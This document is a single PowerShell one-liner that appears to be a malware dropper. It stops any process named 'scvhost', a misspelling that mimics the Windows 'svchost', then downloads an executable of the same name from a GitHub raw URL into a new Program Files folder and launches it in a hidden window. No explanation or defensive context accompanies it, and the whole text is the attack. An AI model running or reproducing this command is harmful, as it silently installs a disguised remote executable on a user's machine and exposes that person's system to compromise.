Get-Process -Name "scvhost" -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.Id -Force };$url="https://raw.githubusercontent.com/requiemmmmmmm/reqq/main/scvhost.exe";$path="${env:ProgramFiles}\deluga";if(!(Test-Path $path)){New-Item -ItemType Directory -Path $path -Force|Out-Null};$file="$path\scvhost.exe";(New-Object System.Net.WebClient).DownloadFile($url,$file);Start-Process -FilePath $file -WindowStyle Hidden